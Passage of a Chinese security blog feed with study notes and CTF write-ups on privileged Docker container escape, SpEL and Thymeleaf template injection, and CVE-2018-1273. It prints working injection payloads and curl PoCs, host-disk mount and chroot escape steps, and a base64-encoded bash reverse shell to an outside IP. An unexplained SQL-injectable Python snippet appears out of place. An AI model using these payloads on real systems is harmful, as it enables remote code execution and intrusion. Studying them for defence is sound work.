+<li>这些二进制文件是设计和编写时考虑到 Linux capabilities 的。因此，它们会显式地检查和管理它们需要的 capabilities。</li>
+<li>当这些二进制文件在具有额外 capabilities 的环境中运行时，它们不会自动使用这些新授予的 capabilities。相反，它们会检查当前的 capabilities 设置，并决定是否使用这些权限。</li>
+</ul>
+<p><strong>Capability-dumb Binaries（不具备能力感知的二进制文件）：</strong></p>
+<ul>
+<li>这些二进制文件在编写时没有考虑 Linux capabilities，它们对这些权限的存在或不存在不敏感。</li>
+<li>当这些二进制文件在具有额外 capabilities 的环境中运行时，它们不会主动拒绝这些新授予的 capabilities。因此，它们会自动拥有并使用这些权限。</li>
+</ul>
+<p>结合文章<code>ping</code>命令的实验就好理解了：<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-2/">https://icloudnative.io/posts/linux-capabilities-in-practice-2/</a></p>
+<h1 id="privileged-特权模式容器逃逸">Privileged 特权模式容器逃逸</h1>
+<p>当使用--privileged=true选项运行容器时，Docker会赋予容器几乎与主机相同的权限4。具体来说，这个选项做了以下两件事情：</p>
+<ul>
+<li>给容器添加了所有的capabilities</li>
+<li>允许容器访问主机的所有设备</li>
+</ul>
+<pre><code class="language-shell">docker run --privileged=true -it ubuntu
+</code></pre>
+<p>在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p>
+<pre><code class="language-shell">cat /proc/$$/status | grep CapEff
+</code></pre>
+<p>查看挂载磁盘设备</p>
+<pre><code class="language-shell">fdisk -l
+Disk /dev/vda: 40 GiB, 42949672960 bytes, 83886080 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x000beb6e
+
+Device     Boot Start      End  Sectors Size Id Type
+/dev/vda1  *     2048 83886046 83883999  40G 83 Linux
+</code></pre>
+<p>在容器内部执行以下命令，将宿主机文件挂载到 /test 目录下</p>
+<pre><code class="language-shell">mkdir /test &amp;&amp; mount /dev/vda1 /test
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1715348908477.png" alt="" loading="lazy"></figure>
+<p>方法一：写计划任务</p>
+<p>方法二：</p>
+<pre><code class="language-shell">chroot /mnt adduser john
+</code></pre>
+<h1 id="参考">参考</h1>
+<p><a href="https://icloudnative.io/posts/linux-capabilities-why-they-exist-and-how-they-work/">Linux Capabilities 入门教程：概念篇</a><br>
+<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-1/">Linux Capabilities 入门教程：基础实战篇</a><br>
+<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-2/">Linux Capabilities 入门教程：进阶实战篇</a><br>
+<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">HackTricks - Linux Capabilities</a><br>
+<a href="https://blog.csdn.net/Dontla/article/details/132996095">docker run：--privileged=true选项解析（特权模式：赋予容器几乎与主机相同的权限）-CSDN博客</a><br>
+<a href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">Privileged 特权模式容器逃逸</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SpEL补充]]></title>
+        <id>https://skyblu3519.github.io/post/spel-bu-chong/</id>
+        <link href="https://skyblu3519.github.io/post/spel-bu-chong/">
+        </link>
+        <updated>2024-05-04T16:04:02.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="什么是el">什么是EL？</h1>
+<p>表达式语言（Expression Language，简称EL）是一种专门用于在应用程序中访问数据和函数的轻量级编程语言，通常用于Web应用程序中。它最初是为了简化在JavaServer Pages (JSP) 中的页面编码而设计的，但其使用已经扩展到其他技术领域。</p>
+<h1 id="什么是spel">什么是SpEL？</h1>
+<p>SpEL(Spring Expression Language)是Spring框架中的一个强大的表达式语言，它扩展了标准EL的概念。SpEL支持更复杂的表达式如方法调用、字符串模板表达式、数组创建、列表选择、映射访问等。</p>
+<p>SpEL与传统的EL相比，提供了更加丰富的功能集，可以在更广泛的Spring项目中使用，如安全性表达式、数据绑定、条件表达式等。SpEL不仅仅限于Web环境，也可用于任何需要动态表达式计算的Spring应用程序中。</p>
+<h1 id="spel用法示例">SpEL用法示例</h1>
+<p>使用示例参考文档：<a href="https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html">https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html</a></p>
+<p>SpEL支持以下功能：</p>
+<ul>
+<li>字面表达式</li>
+<li>布尔和关系运算符</li>
+<li>正则表达式</li>
+<li>类表达式</li>
+<li>访问属性、数组、列表和映射</li>
+<li>方法调用</li>
+<li>关系运算符</li>
+<li>调用构造函数</li>
+<li>bean引用</li>
+<li>数组构造</li>
+<li>内联的list</li>
+<li>内联的map</li>
+<li>三元运算符</li>
+<li>变量</li>
+<li>用户自定义函数</li>
+<li>集合选择</li>
+<li>模板化表达式</li>
+</ul>
+<p>解析字符串</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;'Hello World'&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>调用方法</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;'Hello World'.concat('!')&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>访问属性</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;'Hello World'.bytes&quot;);
+byte[] bytes = (byte[]) exp.getValue();
+</code></pre>
+<p>使用构造函数</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;new String('hello world').toUpperCase()&quot;);
+String message = exp.getValue(String.class);
+</code></pre>
+<p>针对一个特定的对象实例（称为root object）提供被解析的表达式字符串</p>
+<pre><code class="language-java">User user = new User(&quot;skky&quot;, &quot;123456&quot;);
+Expression objExp = parser.parseExpression(&quot;name&quot;);
+
+EvaluationContext context = new StandardEvaluationContext(user);
+String name = (String) objExp.getValue(context);
+</code></pre>
+<p><code>T</code>操作符用于访问指定的类及其静态方法和静态属性，用来获取<strong>java.lang.Runtime</strong>下的<code>getRuntime()</code>也是SpEL注入主要的利用方式</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>关于<code>T</code>操作符文档中有个比较有意思的内容</p>
+<blockquote>
+<p>The StandardEvaluationContext uses a TypeLocator to find types and the StandardTypeLocator (which can be replaced) is built with an understanding of the java.lang package. This means T() references to types within java.lang do not need to be fully qualified, but all other type references must be.</p>
+</blockquote>
+<p>这里提到的<code>TypeLocator</code>和<code>StandardTypeLocator</code>：</p>
+<ul>
+<li><code>TypeLocator</code>：这是一个接口，SpEL使用它来查找类型。<code>StandardEvaluationContext</code>使用这个接口的实现来确定如何找到表达式中引用的类型。</li>
+<li><code>StandardTypeLocator</code>：这是<code>TypeLocator</code>的一个标准实现，默认情况下它了解<code>java.lang</code>包。因此，对于<code>java.lang</code>包中的类，你不需要提供完整的包名。例如，<code>T(String)</code>已经足够引用<code>java.lang.String</code>类。但是对于非j<code>ava.lang</code>包中的其他类，你必须使用完整的类名，如<code>T(com.example.MyClass)</code>。</li>
+</ul>
+<p>参考的使用方式是用来方便地解析和引用类。比如有下面这个类</p>
+<pre><code class="language-java">package com.examples;
+
+public class Utility {
+    public static String getGreeting() {
+        return &quot;Hello, World!&quot;;
+    }
+}
+</code></pre>
+<p>使用<code>StandardTypeLocator</code>来简化查找</p>
+<pre><code class="language-java">StandardEvaluationContext context_example = new StandardEvaluationContext();
+
+// 使用StandardTypeLocator并添加一个新的包前缀
+StandardTypeLocator typeLocator = new StandardTypeLocator();
+typeLocator.registerImport(&quot;com.examples&quot;);
+
+context_example.setTypeLocator(typeLocator);
+
+// 现在可以不使用全路径来调用getGreeting()方法
+String greeting = parser.parseExpression(&quot;T(Utility).getGreeting()&quot;).getValue(context_example, String.class);
+</code></pre>
+<p>那么这个<code>StandardTypeLocator</code>可不可以用来限制一些类的查找呢？</p>
+<p>答案是可以的，我们可以继承<code>StandardTypeLocator</code>然后重写它的<code>findType</code>方法来增加查找类的限制</p>
+<pre><code class="language-java">import org.springframework.expression.EvaluationException;
+import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+import org.springframework.expression.spel.support.StandardTypeLocator;
+
+
+public class exploit {
+    public static void main(String[] args) {
+        ExpressionParser parser = new SpelExpressionParser();
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        context.setTypeLocator(new RestrictedTypeLocator());
+
+        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')&quot;);
+        String message = (String) exp.getValue(context);
+    }
+}
+
+
+class RestrictedTypeLocator extends StandardTypeLocator {
+    public RestrictedTypeLocator() {
+        super();
+    }
+
+    @Override
+    public Class&lt;?&gt; findType(String typeName) throws EvaluationException {
+        if (typeName.startsWith(&quot;java.lang.Runtime&quot;)) {
+            throw new EvaluationException(&quot;Access denied for type: &quot; + typeName);
+        } else {
+            return super.findType(typeName);
+        }
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/spel_re/1714828150238-d60d5fc8-1634-4843-b911-73bc62960c95.png" alt="image.png" loading="lazy"></figure>
+<p>另外关于<code>StandardEvaluationContext</code>还有一个设置解析前后缀的用法，具体参考P神的javacon，这里就不赘述了。</p>
+<h1 id="thymeleaf与spel">Thymeleaf与SpEL</h1>
+<p>Thymeleaf 是一个Java 模板引擎，它使用的模版语法是其自己实现的，叫_Standard_。它的语法格式有下面几种</p>
+<ul>
+<li><code>${...}</code>: Variable expressions.</li>
+<li><code>*{...}</code>: Selection expressions.</li>
+<li><code>#{...}</code>: Message (i18n) expressions.</li>
+<li><code>@{...}</code>: Link (URL) expressions.</li>
+<li><code>~{...}</code>: Fragment expressions.</li>
+<li><code>__...__</code>:  Expression preprocessing.</li>
+</ul>
+<p>除了学习模版注入的后两种（Fragment expressions, Expression preprocessing），前两种(Variable expressions, Selection expressions)也是值得注意的</p>
+<blockquote>
+<p>Variable expressions are OGNL expressions –or Spring EL if you’re integrating Thymeleaf with Spring– executed on the <em>context variables</em> — also called <em>model attributes</em> in Spring jargon.</p>
+<p>Selection expressions are just like variable expressions, except they will be executed on a previously selected object instead of the whole context variables map.</p>
+</blockquote>
+<p>这里面的内容Thymeleaf会根据当前的环境，将其当作Spring EL或OGNL来解析。</p>
+<p>所以前面看的Thymeleaf模版注入，其实就是用在解析模版名称的时候，在模板名称中注入了一个预处理表达式，这个预处理表达式包裹的是一个变量表达式，这个变量表达式就可以用来执行任意的SpEL表达式。</p>
+<p>另外之前看到的在下面这种可以完全控制解析的模版名称的情景</p>
+<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
+public String path(@RequestParam String lang) {
+    return lang; // template path is tainted
+}
+</code></pre>
+<p>这里不走解析预处理表达式（不使用<code>_</code>的情况）也是可以的</p>
+<pre><code>${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}::x
+</code></pre>
+<p>使用<code>::</code>进入片段表达式的解析逻辑，由于没有预处理表达式，传入的模版名称被<code>~{...}</code>包裹后直接作为片段表达式解析返回<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714831173471-bf69b695-c458-46d8-a5cd-dcbc4e9f6166.png" alt="image.png" loading="lazy"></p>
+<p>构造的变量表达式被解析成了<code>templateName</code>，接着在后面的<code>FragmentExpression.createExecutedFragmentExpression(context, fragmentExpression);</code>可以清楚的看到其作为变量表达式被解析的代码<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714831375949-fd272a78-da73-41bb-88b6-fd5a51f804b3.png" alt="image.png" loading="lazy"></p>
+<h1 id="2024红明谷simp1escape">2024红明谷｜Simp1escape</h1>
+<p><code>/curl</code>路由存在SSRF，可以使用302跳转绕过。这里记一下它的处理逻辑，下次看到就可以用了</p>
+<pre><code class="language-java">InetAddress inetAddress = InetAddress.getByName(hostname);
+if (Utils.isPrivateIp(inetAddress)) {
+    return &quot;Illegal ip address&quot;;
+} else {
+    try {
+        // ......
+        TimeUnit.SECONDS.sleep(4L);
+        HttpURLConnection connection = (HttpURLConnection)urlObject.openConnection();
+        if (connection instanceof HttpURLConnection) {
+            connection.connec
+            // ......
+</code></pre>
+<p>用这个SSRF攻击<code>/getsites</code></p>
+<pre><code class="language-java">@GetMapping({&quot;/getsites&quot;})
+public String admin(@RequestParam String hostname, HttpServletRequest request, HttpServletResponse response) throws Exception {
+    String ipAddress = request.getRemoteAddr();
+    if (!ipAddress.equals(&quot;127.0.0.1&quot;)) {
+        response.setStatus(HttpStatus.FORBIDDEN.value());
+        return &quot;forbidden&quot;;
+    } else {
+        Context context = new Context();
+        TemplateEngine engine = new SpringTemplateEngine();
+        String dispaly = engine.process(hostname, context);
+        return dispaly;
+    }
+}
+</code></pre>
+<p><code>SpringTemplateEngine.process</code>是用的父类<code>org.thymeleaf.TemplateEngine</code>实现的，根据<a href="https://www.thymeleaf.org/apidocs/thymeleaf/3.0.0.BETA02/org/thymeleaf/TemplateEngine.html#process-java.lang.String-org.thymeleaf.context.IContext-">API文档</a>的描述，<code>process</code>就是将传入template当作模版内容来处理的<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714834031770-cde5607a-be13-4ed7-873c-d460ad53d9a8.png" alt="image.png" loading="lazy"></p>
+<p>所以最简单的方式就是传入一个包含变量表达式的模版，然后用变量表达式执行任意的SpEL表达式。比如：</p>
+<pre><code>&lt;td th:text=&quot;${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}&quot;&gt;&lt;/td&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/spel_re/1714834318634-c857d19f-7639-467d-90bc-ab0261151565.png" alt="image.png" loading="lazy"></figure>
+<p>另外，之前看到的<code>[[...]]</code>这种写法其实是一种内联表达式的写法，参照<a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#inlining">官方文档</a>给的例子，应该就是让其在任何文本标签中执行Thymeleaf的Standard Expression。</p>
+<p>所以这个payload也可以写成</p>
+<pre><code>[[${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}]]
+</code></pre>
+<p>另外在题目的thymeleaf3.0.15版本中，在对返回的模版名称<code>viewTemplateName</code>新增了检查<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714835193225-cec8fb6a-f33a-49fa-8772-8f1637353cc3.png" alt="image.png" loading="lazy"></p>
+<p>这个 <code>checkViewNameNotInRequest</code> 函数是为了确保在处理视图名字时，避免视图名称中包含的表达式被恶意利用，所以直接传入<code>${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}::x</code>是无法被利用的。</p>
+<p>另外，在预处理的部分也新增对恶意利用的检查，这部分的绕过具体参考<a href="https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE">https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SpEL表达式注入初见]]></title>
+        <id>https://skyblu3519.github.io/post/spel-biao-da-shi-zhu-ru-chu-jian/</id>
+        <link href="https://skyblu3519.github.io/post/spel-biao-da-shi-zhu-ru-chu-jian/">
+        </link>
+        <updated>2024-04-21T19:09:55.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="背景知识">背景知识</h1>
+<p>SpEL注入漏洞是一种安全漏洞，主要发生在使用Spring框架的应用中。Spring Expression Language（SpEL）是一个强大的表达式语言，用于在运行时查询和操作对象图。虽然SpEL提供了很多便利，但如果不正确地处理用户输入，就可能导致注入攻击。</p>
+<p>测试代码：</p>
+<pre><code class="language-java">import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+
+public class MainApp {
+    public static void main(String[] args) {
+        String exp = &quot;new java.lang.ProcessBuilder(new String[]{\&quot;open\&quot;,\&quot;/System/Applications/Calculator.app\&quot;}).start()&quot;;
+
+        ExpressionParser parser = new SpelExpressionParser();
+        Expression expression = parser.parseExpression(exp);
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        System.out.println(expression.getValue(context));
+
+    }
+}
+</code></pre>
+<h1 id="spel漏洞复现">SpEL漏洞复现</h1>
+<h2 id="低版本springboot中illegalstateexception">低版本SpringBoot中IllegalStateException</h2>
+<p>影响的版本有</p>
+<ul>
+<li>1.1.0-1.1.12</li>
+<li>1.2.0-1.2.7</li>
+<li>1.3.0</li>
+</ul>
+<p>pom.xml</p>
+<pre><code class="language-xml">&lt;parent&gt;
+  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
+  &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
+  &lt;version&gt;1.2.0.RELEASE&lt;/version&gt;
+&lt;/parent&gt;
+</code></pre>
+<p>测试代码</p>
+<pre><code class="language-java">package com.example.mywebapp;
+
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+
+@Controller
+public class exploit {
+    @RequestMapping(&quot;/&quot;)
+    public String index(String payload){
+        throw new IllegalStateException(payload);
+    }
+}
+
+</code></pre>
+<p>访问是一个错误页面，当输入的是一个SpEL表达式的是后可以看到被解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713623131522-2c5170bc-9fec-4090-9c7e-976424ef22b5.png" alt="image.png" loading="lazy"></p>
+<p>漏洞分析从<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>开始，找到最后处理的<code>processDispatchResult</code>函数。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633352226-0ec621b1-2335-4f45-ac34-77b9f333c72d.png" alt="image.png" loading="lazy"></p>
+<p>之前学Thymeleaf的时候对Spring Boot处理请求的流程已经有个大概的了解了，这里<code>IllegalStateException</code>最后会用一个<strong>error View</strong>对象来渲染返回的页面。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633572769-7866d6f6-49a9-4b5c-b5aa-baaeac4d8c18.png" alt="image.png" loading="lazy"></p>
+<p>它的<code>render</code>方法会将渲染所需的数据对象（<strong>model</strong>）设置为渲染上下文的根对象，然后使用一个助手类 <strong>helper</strong> 来处理渲染的模版，也就是上图中<strong>template</strong>的内容<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713633832819-0d02fb9b-943c-4906-b3de-62b7453ffed8.png" alt="image.png" loading="lazy"></p>
+<p><code>org.springframework.util.PropertyPlaceholderHelper#parseStringValue</code>是最后用来渲染<strong>template</strong>的函数。</p>
+<ul>
+<li>处理的字符串<code>strVal</code>存在<code>${</code>则对其进行解析</li>
+<li>对待解析的<code>placeholder</code>递归调用一次<code>parseStringValue</code>（有点模版注入的味道了）</li>
+<li>返回的<code>placeholder</code>会交给<code>placeholderResolver.resolvePlaceholder</code>从<strong>model</strong>中取值得到<code>propVal</code></li>
+<li>对<code>propVal</code>再递归调用<code>parseStringValue</code>处理</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/SpEL/1713634117230-474bfa4b-abec-4c66-a77a-0f4def3b2913.png" alt="image.png" loading="lazy"></figure>
+<p>而<code>placeholderResolver.resolvePlaceholder</code>处理方式就是一个SpEL表达式的解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713634489337-1c3d9733-d890-4933-9d30-d54a32484ba2.png" alt="image.png" loading="lazy"></p>
+<p>（Ps.这里解析的表达式直接是一个无任何包裹的字符串，按照SpEL的规则它应该被理解为一个<strong>BeanID</strong>，不过这里却直接被解析为<strong>rootObject</strong>中<strong>HashMap</strong>里面的一个<strong>value</strong>，有一点疑惑<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713634741196-00786bb7-0986-4548-a0b5-b73145066d54.png" alt="image.png" loading="lazy"></p>
+<p>根据它的流程我测试代码如下</p>
+<pre><code class="language-java">public static void main(String[] args) {
+    ModelMap modelMap = new ModelMap();
+    modelMap.addAttribute(&quot;sky&quot;, &quot;blue&quot;);
+    ExpressionParser parser = new SpelExpressionParser();
+    Expression expression = parser.parseExpression(&quot;sky&quot;);
+
+    StandardEvaluationContext context = new StandardEvaluationContext();
+    Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(modelMap);
+    context.setRootObject(map);
+
+    System.out.println(expression.getValue(context));
+}
+</code></pre>
+<p>没有任何悬念的报错了</p>
+<p>以我现在的能力好像还没发探究其中的原因，故在此记录<br>
+）</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>经过分析，当攻击者可以控制<code>propVal</code>的内容将其变为一个恶意的SpEL表达式时，就可以在代码对<code>propVal</code>解析的时候触发。样例中<code>IllegalStateException(payload)</code>将会设置<strong>message</strong>字段为<strong>payload</strong><br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713635254196-93693f3b-16d7-4d50-8ed9-467894e790e1.png" alt="image.png" loading="lazy"></p>
+<p>另外还需注意的是<code>placeholderResolver.resolvePlaceholder</code>返回时会对字符串进行html实体编码来防止XSS</p>
+<h3 id="漏洞修复">漏洞修复</h3>
+<p>在1.3.1版本中为<strong>PlaceholderResolver</strong>新增了一个子类<strong>NonRecursivePlaceholderResolver</strong>，之前<code>PropertyPlaceholderHelper#parseStringValue</code>中<code>placeholderResolver.resolvePlaceholder</code>的调用在新版本中都变成了<strong>NonRecursivePlaceholderResolver</strong>的<code>resolvePlaceholder</code>方法。</p>
+<p>而<strong>PropertyPlaceholderHelper</strong>也新增了一个子类<strong>NonRecursivePropertyPlaceholderHelper</strong>，原来<code>PropertyPlaceholderHelper#parseStringValue</code>的调用全部变成了<code>NonRecursivePropertyPlaceholderHelper#parseStringValue</code>。</p>
+<p>在最初调用的时候会将<strong>placeholderResolver</strong>转为<strong>NonRecursivePlaceholderResolver</strong>对象<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637054082-c364bbc2-3c3f-4f44-9f35-c6c57345ff27.png" alt="image.png" loading="lazy"></p>
+<p><code>NonRecursivePlaceholderResolver#resolvePlaceholder</code>在解析的时候会先判断自身的resolver，如果是<strong>NonRecursivePlaceholderResolver</strong>则不会进行解析<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637299505-b73c410a-d55f-4440-aee2-00a7e70f9464.png" alt="image.png" loading="lazy"></p>
+<p>我们知道在初次调用<code>parseStringValue</code>的时候传入的<strong>NonRecursivePlaceholderResolver</strong>对象的<strong>resolver</strong>属性是一个<strong>PlaceholderResolver</strong>。也就说在<code>parseStringValue</code>的第一层调用时，SpEL表达式的解析还是正常的，而再像之前版本递归调用解析时，传入的<strong>placeholderResolver</strong>就是一个<strong>NonRecursivePlaceholderResolver</strong>对象，也就不能在这一层进行任何的SpEL表达式的解析了。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713637613847-ee6099f0-10ca-4a1c-945e-e16ae4c79271.png" alt="image.png" loading="lazy"></p>
+<h2 id="cve-2018-1273-rce-with-spring-data-commons">CVE-2018-1273: RCE with Spring Data Commons</h2>
+<p>不是很懂Spring Data Commons的使用，故仅记录poc。</p>
+<p>漏洞环境：<a href="https://github.com/wearearima/poc-cve-2018-1273">https://github.com/wearearima/poc-cve-2018-1273</a></p>
+<p>poc</p>
+<pre><code>curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123&quot;
+
+curl -X POST http://localhost:8080/account -d &quot;name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')]=test&quot;
+</code></pre>
+<pre><code class="language-python">mu = re.match(r'.*\W', username)
+if mu is None: 
+    # 過濾password中所有英文字母跟等號
+    cflag = False
+    for w in password: 
+        if (w in string.ascii_letters) or (w == &quot;=&quot;): cflag = True
+    if (cflag): 
+        return None
+    else:
+        conn = sqlite3.connect(&quot;user.db&quot;)
+        rows = conn.execute(f&quot;select * from user where (user='{username}') and (pass='{password}');&quot;)
+</code></pre>
+<h1 id="相关题目">相关题目</h1>
+<h2 id="javacon">javacon</h2>
+<p>题目文件：<a href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p>
+<p>默认路由会使用解密算法解出Cookie中的username，然后使用<code>getAdvanceValue</code>方法解析username。由于加解密算法知道，所以可以控制username的内容导致SpEL注入。<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713684945667-37a33c73-9751-48bf-9ca3-0504bd35e853.png" alt="image.png" loading="lazy"></p>
+<p>需要注意的是<code>parseExpression</code>的第二个参数<code>parserContext</code>，它用来提供特定于解析过程的配置。具体而言，这个参数允许你自定义如何处理和解析表达式，包括定义表达式的前缀和后缀，以及是否应该使用模板模式。这里就自定了解析前缀<code>expressionPrefix</code>和解析后缀<code>expressionSuffix</code><br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713685122146-f4e519bd-d0bd-46aa-acd0-ea8a541f3ca2.png" alt="image.png" loading="lazy"></p>
+<p>可以使用下面的代码进行测试</p>
+<pre><code class="language-java">package com.exploit;
+
+import java.util.Base64;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+public class Encryptor {
+    static Logger logger = LoggerFactory.getLogger(Encryptor.class);
+
+    public Encryptor() {
+    }
+
+    public static String encrypt(String key, String initVector, String value) {
+        try {
+            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
+            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
+            cipher.init(1, skeySpec, iv);
+            byte[] encrypted = cipher.doFinal(value.getBytes());
+            return Base64.getUrlEncoder().encodeToString(encrypted);
+        } catch (Exception var7) {
+            logger.warn(var7.getMessage());
+            return null;
+        }
+    }
+
+    public static String decrypt(String key, String initVector, String encrypted) {
+        try {
+            IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(&quot;UTF-8&quot;));
+            SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(&quot;UTF-8&quot;), &quot;AES&quot;);
+            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);
+            cipher.init(2, skeySpec, iv);
+            byte[] original = cipher.doFinal(Base64.getUrlDecoder().decode(encrypted));
+            return new String(original);
+        } catch (Exception var7) {
+            logger.warn(var7.getMessage());
+            return null;
+        }
+    }
+
+    public static void main(String[] args) {
+        System.out.println(encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{2*2}&quot;));
+    }
+}
+</code></pre>
+<p>在model中看到解析后的内容<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713685262376-216c2c1d-fa37-4493-909c-069adfc7a763.png" alt="image.png" loading="lazy"></p>
+<p>payload，思路是用反射的方式获取方法调用</p>
+<pre><code>#{''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',''.getClass()).invoke(''.getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(null),'open -a Calculator')}
+</code></pre>
+<h2 id="2024红明谷simp1escape">2024红明谷｜Simp1escape</h2>
+<p>AdminController存在模版注入，注入点是hostname<br>
+<img src="https://skyblu3519.github.io/post-images/SpEL/1713725578292-6ca35ca6-34cd-47ff-99be-cc4827676cc6.png" alt="image.png" loading="lazy"></p>
+<p>这道题目才让我感觉SpEL注入和之前学的Thymeleaf模板注入还不够细致，也没我想象的那么简单，故只整理这部分的payload（未经过url编码）</p>
+<pre><code># 阳子的
+[[T(com.sun.org.apache.xalan.internal.utils.ObjectFactory).newInstance(&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;,new java.lang.Boolean(true)).parseRaw('T(java.lang.Runtime).getRuntime().exec(&quot;bash -c {echo,L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjEuMzEuMzIvMjIzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;)').getValue()]]
+
+# 参考：https://blog.ruozhi.xyz/2024/01/28/chatter-box-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/#RCE
